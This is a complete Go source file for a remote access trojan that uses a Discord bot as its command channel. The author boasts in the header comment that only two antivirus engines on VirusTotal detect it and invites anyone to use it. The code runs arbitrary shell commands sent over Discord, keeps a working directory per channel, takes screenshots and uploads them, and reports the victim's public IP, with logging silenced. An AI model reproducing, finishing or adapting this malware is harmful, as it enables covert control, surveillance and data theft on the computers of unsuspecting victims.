// Well hello dear skidler, here is the code for a rat with 2 detected on virus total, Do with it what you want.
// But do give credits if you use it to @cyrossh on discord

package main

import (
	"bytes"
	"fmt"
	"image/png"
	"io"
	"log"
	"net/http"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"syscall"

	"github.com/bwmarrin/discordgo"
	"github.com/kbinani/screenshot"
)

const (
	BotToken = "put ur fuck ass discord bot token here"
	Prefix   = "!"
)

type session struct {
	currentDir string
}

var (
	sessionManager = make(map[string]*session)
	sessionMutex   = &sync.Mutex{}
)

func main() {
	log.SetOutput(io.Discard)
	if BotToken == "" {
		log.Fatal("it broke.")
	}

	dg, err := discordgo.New("Bot " + BotToken)
	if err != nil {
		log.Fatalf(" %v", err)
	}

	dg.AddHandler(messageCreate)
	dg.Identify.Intents = discordgo.IntentsGuilds | discordgo.IntentsGuildMessages

	err = dg.Open()
	if err != nil {
		log.Fatalf(" %v", err)
	}
	sc := make(chan os.Signal, 1)
	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt)
	<-sc

	dg.Close()
}

func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
	if m.Author.ID == s.State.User.ID {
		return
	}
	if !strings.HasPrefix(m.Content, Prefix) {
		return
	}

	parts := strings.Fields(m.Content[len(Prefix):])
	if len(parts) == 0 {
		return
	}
	cmd := parts[0]
	args := parts[1:]

	switch strings.ToLower(cmd) {
	case "shell":
		handleShellCommand(s, m, strings.Join(args, " "))
	case "screenshot":
		handleScreenshot(s, m)
	case "ip":
		handleIP(s, m)
	default:
		handleShellCommand(s, m, strings.Join(append([]string{cmd}, args...), " "))
	}
}

func getOrCreateSession(channelID string) *session {
	sessionMutex.Lock()
	defer sessionMutex.Unlock()

	if ses, exists := sessionManager[channelID]; exists {
		return ses
	}

	wd, err := os.Getwd()
	if err != nil {
		wd, _ = os.UserHomeDir()
	}
	newSession := &session{currentDir: wd}
	sessionManager[channelID] = newSession
	return newSession
}

func handleScreenshot(s *discordgo.Session, m *discordgo.MessageCreate) {
	n := screenshot.NumActiveDisplays()
	if n <= 0 {
		s.ChannelMessageSend(m.ChannelID, "No active displays found.")
		return
	}
	bounds := screenshot.GetDisplayBounds(0)
	img, err := screenshot.CaptureRect(bounds)
	if err != nil {
		s.ChannelMessageSend(m.ChannelID, "Failed to capture screen: "+err.Error())
		return
	}

	var buf bytes.Buffer
	if err := png.Encode(&buf, img); err != nil {
		s.ChannelMessageSend(m.ChannelID, "Failed to encode image: "+err.Error())
		return
	}

	s.ChannelFileSend(m.ChannelID, "screenshot.png", &buf)
}

func handleIP(s *discordgo.Session, m *discordgo.MessageCreate) {
	resp, err := http.Get("https://api.ipify.org")
	if err != nil {
		s.ChannelMessageSend(m.ChannelID, "Failed to get IP: "+err.Error())
		return
	}
	defer resp.Body.Close()

	ip, err := io.ReadAll(resp.Body)
	if err != nil {
		s.ChannelMessageSend(m.ChannelID, "Failed to read IP response: "+err.Error())
		return
	}

	s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("Public IP: `%s`", string(ip)))
}

func handleShellCommand(s *discordgo.Session, m *discordgo.MessageCreate, command string) {
	if command == "" {
		s.ChannelMessageSend(m.ChannelID, "Usage: `!shell <command>`")
		return
	}

	ses := getOrCreateSession(m.ChannelID)
	sessionMutex.Lock()
	defer sessionMutex.Unlock()

	if strings.HasPrefix(command, "cd ") {
		newDir := strings.TrimSpace(strings.TrimPrefix(command, "cd "))
		if newDir == "~" {
			newDir, _ = os.UserHomeDir()
		} else if !filepath.IsAbs(newDir) {
			newDir = filepath.Join(ses.currentDir, newDir)
		}
		newDir = filepath.Clean(newDir)

		info, err := os.Stat(newDir)
		if os.IsNotExist(err) {
			s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("```cd: no such directory: %s```", newDir))
			return
		} else if !info.IsDir() {
			s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("```cd: not a directory: %s```", newDir))
			return
		}

		ses.currentDir = newDir
		s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("`New directory: %s`", ses.currentDir))
		return
	}

	// Windows vs Unix compatibility
	var cmdExec *exec.Cmd
	if runtime.GOOS == "windows" {
		cmdExec = exec.Command("cmd", "/C", command)
	} else {
		cmdExec = exec.Command("sh", "-c", command)
	}
	cmdExec.Dir = ses.currentDir
	output, err := cmdExec.CombinedOutput()
	outputStr := string(output)

	if err != nil && !strings.Contains(outputStr, err.Error()) {
		outputStr += "\nError: " + err.Error()
	}
	if outputStr == "" {
		outputStr = "[No output]"
	}

	const maxLen = 1990
	for len(outputStr) > 0 {
		chunkSize := len(outputStr)
		if chunkSize > maxLen {
			chunkSize = maxLen
		}
		s.ChannelMessageSend(m.ChannelID, "```"+outputStr[:chunkSize]+"```")
		outputStr = outputStr[chunkSize:]
	}
}
